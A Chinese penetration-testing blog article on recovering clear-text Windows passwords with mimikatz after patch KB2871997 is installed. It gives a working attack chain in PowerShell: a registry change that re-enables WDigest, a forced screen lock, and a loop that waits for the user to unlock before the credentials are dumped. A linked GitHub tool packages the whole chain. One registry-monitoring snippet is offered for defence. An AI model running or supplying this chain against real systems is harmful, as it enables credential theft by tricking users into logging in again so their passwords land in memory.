# 域渗透——Dump Clear-Text Password after KB2871997 installed

0x00 前言
=======

* * *

在渗透测试中，渗透测试人员通常会使用mimikatz从LSA的内存中导出系统的明文口令，而有经验的管理员往往会选择安装补丁`kb2871997`来限制这种行为。这其中涉及到哪些有趣的细节呢？本文将会一一介绍。

![Alt text](http://drops.javaweb.org/uploads/images/c8fcae6ed8840a0a89139f4538dbb8f8ac46d294.jpg)

图片来自[https://pixabay.com/zh/%E5%AF%86%E7%A0%81-%E5%AE%89%E5%85%A8-%E8%BD%AC%E5%82%A8-%E5%86%85%E5%AD%98-%E4%BA%8C%E8%BF%9B%E5%88%B6-%E9%95%9C%E5%A4%B4-%E6%89%8B-%E6%89%8B%E6%8C%87-%E5%8F%8D%E5%B0%84-704252/](https://pixabay.com/zh/%E5%AF%86%E7%A0%81-%E5%AE%89%E5%85%A8-%E8%BD%AC%E5%82%A8-%E5%86%85%E5%AD%98-%E4%BA%8C%E8%BF%9B%E5%88%B6-%E9%95%9C%E5%A4%B4-%E6%89%8B-%E6%89%8B%E6%8C%87-%E5%8F%8D%E5%B0%84-704252/)

0x01 简介
=======

* * *

### KB2871997：

更新KB2871997补丁后，可禁用Wdigest Auth强制系统的内存不保存明文口令，此时mimikatz和wce均无法获得系统的明文口令。但是其他一些系统服务(如IIS的SSO身份验证)在运行的过程中需要Wdigest Auth开启，所以补丁采取了折中的办法——安装补丁后可选择是否禁用Wdigest Auth。当然，如果启用Wdigest Auth，内存中还是会保存系统的明文口令。

**支持系统：**

*   Windows 7
*   Windows 8
*   Windows 8.1
*   Windows Server 2008
*   Windows Server 2012
*   Windows Server 2012R 2

**配置：**

**1、**下载补丁并安装

下载地址：  
[https://support.microsoft.com/en-us/kb/2871997](https://support.microsoft.com/en-us/kb/2871997)

**2、**配置补丁

下载easy fix并运行，禁用Wdigest Auth

**注：**  
easy fix的操作其实就是改了注册表的键值，所以这里我们可以手动操作注册表来禁用Wdigest Auth

对应的注册表路径为：

```
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest

```

名称为：

```
UseLogonCredential

```

类型为：

```
REG_DWORD

```

值为：

```
0

```

使用批处理的命令为：

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f

```

如图

![Alt text](http://drops.javaweb.org/uploads/images/055047d4c5676720137347682e11928290f8ada0.jpg)

**3、**重启系统

测试无法导出明文口令

如图

![Alt text](http://drops.javaweb.org/uploads/images/32cb5d94232bae0f9c14e3a4ea8faeed9cd4dc33.jpg)

0x02 解决方法
=========

* * *

需要将UseLogonCredential的值设为1，然后注销当前用户，用户再次登录后使用mimikatz即可导出明文口令。

Nishang中的Invoke-MimikatzWDigestDowngrade集成了这个功能，地址如下：

> [https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1)

但是在功能上还无法做到一键操作，于是我对此做了扩展。

0x03 扩展思路
=========

* * *

**操作流程如下：**

*   修改注册表
*   锁屏等待用户登录
*   用户登录后，立即导出明文口令

**脚本实现上需要考虑如下问题：**

1.  修改注册表
2.  锁屏
3.  进入循环，判断当前系统是否结束锁屏状态
4.  用户登录后，跳出循环等待，立即导出明文口令并保存

0x04 扩展方法
=========

* * *

**通过powershell实现**

### 1、修改注册表

键值设为1：

```
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1

```

循环判断注册表键值是否为0，如果为1，等待10s再次判断，如果为0，退出循环，可用来监控此注册表键值是否被修改：

```
$key=Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" -Name "UseLogonCredential"
$Flag=$key.UseLogonCredential
write-host "[+]Checking Flag"
while($Flag -eq 1)
{
    write-host "[+]Flag Normal"
    write-host "[+]Wait 10 Seconds..."
    Start-Sleep -Seconds 10
    $key=Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" -Name "UseLogonCredential"
    $Flag=$key.UseLogonCredential
    write-host "[+]Checking Flag"
}
write-host "[!]Flag Changed!"

```

如图

![Alt text](http://drops.javaweb.org/uploads/images/f8dc295b0104bfe306c846b59cd70c177d2162dc.jpg)

### 2、锁屏

锁屏操作的快捷键为`Win+L`

cmd下命令为：

```
rundll32.exe user32.dll,LockWorkStation

```

powershell代码如下：

```
Function Lock-WorkStation {
$signature = @"
[DllImport("user32.dll", SetLastError = true)]
public static extern bool LockWorkStation();
"@

$LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru
$LockWorkStation::LockWorkStation() | Out-Null
}
Lock-WorkStation

```

如图

![Alt text](http://drops.javaweb.org/uploads/images/efd1f158261183a1004f4616beb73be47bb7281a.jpg)

### 3、判断当前系统是否结束锁屏状态

最开始的思路为锁屏会运行某个进程，在结束锁屏状态后会退出某个进程或是在结束锁屏状态后会启动某个进程，于是编写了如下测试代码：

判断进程notepad进程是否存在，如果不存在等待10s再次判断，如果存在，退出循环：

```
$id=Get-Process | Where-Object {$_.ProcessName.Contains("notepad") }
$Flag=$id.Id+0
write-host "[+]Checking tasklist"
while($Flag -eq 0)
{
    write-host "[-]No notepad.exe"
    write-host "[+]Wait 10 Seconds..."
    Start-Sleep -Seconds 10
    $id=Get-Process | Where-Object {$_.ProcessName.Contains("notepad") }
    $Flag=$id.Id+0
    write-host "[+]Checking tasklist"  
}
write-host "[!]Got notepad.exe!"

```

但是实际测试效果均不太理想，后来在如下链接找到了解决思路：

> [http://stackoverflow.com/questions/9563549/what-happens-behind-the-windows-lock-screen](http://stackoverflow.com/questions/9563549/what-happens-behind-the-windows-lock-screen)

锁屏状态下GetForegroundWindow()的函数返回值为NULL，非锁屏状态下GetForegroundWindow()的函数返回值为一个非零的值。

对于GetForegroundWindow()的函数用法可在如下链接找到参考：

> [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1)

于是在此基础上实现功能：

循环判断当前是否为锁屏状态，如果不是锁屏状态，退出循环，否则循环等待

```
function local:Get-DelegateType {
  Param (
    [OutputType([Type])]
  [Parameter( Position = 0)]
  [Type[]]
  $Parameters = (New-Object Type[](0)),
    [Parameter( Position = 1 )]
  [Type]
  $ReturnType = [Void]
  )
    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')

    $TypeBuilder.CreateType()
}
function local:Get-ProcAddress {
  Param (
    [OutputType([IntPtr])]
  [Parameter( Position = 0, Mandatory = $True )]
  [String]
  $Module,
    [Parameter( Position = 1, Mandatory = $True )]
  [String]
  $Procedure
    )
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
  $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    $GetProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
Start-Sleep -Seconds 10
$GetForegroundWindowAddr = Get-ProcAddress user32.dll GetForegroundWindow
$GetForegroundWindowDelegate = Get-DelegateType @() ([IntPtr])
$GetForegroundWindow = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetForegroundWindowAddr, $GetForegroundWindowDelegate)
$hWindow = $GetForegroundWindow.Invoke()


write-host "[+]Checking Flag"
while($hWindow -eq 0)
{
  write-host "[+]LockScreen"
  write-host "[+]Wait 10 Seconds..."
  Start-Sleep -Seconds 10
  $GetForegroundWindowAddr = Get-ProcAddress user32.dll GetForegroundWindow
  $GetForegroundWindowDelegate = Get-DelegateType @() ([IntPtr])
  $GetForegroundWindow = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetForegroundWindowAddr, $GetForegroundWindowDelegate)
  $hWindow = $GetForegroundWindow.Invoke()
  write-host "[+]Checking Flag"

}
write-host "[!]Got Screen!"

```

为方便演示，上面的脚本添加了等待10s后再判断的功能，如图

![Alt text](http://drops.javaweb.org/uploads/images/63159ad0847670b98056146cdcaf29bb8316d6bd.jpg)

### 4、用户登录后，跳出循环等待，立即导出明文口令并保存

导出口令的功能参考如下代码

> [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)

通过powershell加载mimikatz导出明文口令，添加了保存、判断、循环等细节，整合文中的功能，完整的代码已上传至github，地址为:

[https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed](https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed)

完整演示如图

![Alt text](http://drops.javaweb.org/uploads/images/e4cb590b459ae7f3762e8207f896ef44b9130e18.jpg)

0x05 小结
=======

* * *

本文对加载mimikatz导明文口令的powershell脚本做了扩充，添加了如下功能：

*   修改注册表键值，启用Wdigest Auth
*   自动锁屏，等待用户重新登录
*   判断当前锁屏状态，用户解锁登录后立即导出明文口令

同时也通过powershell实现了监控并记录对注册表键值的修改，可用作防御

0x06 补充
=======

* * *

> [https://github.com/l3m0n/pentest_study](https://github.com/l3m0n/pentest_study)

见上面的链接，l3m0n对渗透测试的整理很是细心，是个很好的学习资料。另外在其github上`hash抓取`这一章中的`win8+win2012明文抓取`描述为测试失败，希望本文对你(@l3m0n)有用

**更多学习资料：**

[https://blogs.technet.microsoft.com/kfalde/2014/11/01/kb2871997-and-wdigest-part-1/](https://blogs.technet.microsoft.com/kfalde/2014/11/01/kb2871997-and-wdigest-part-1/)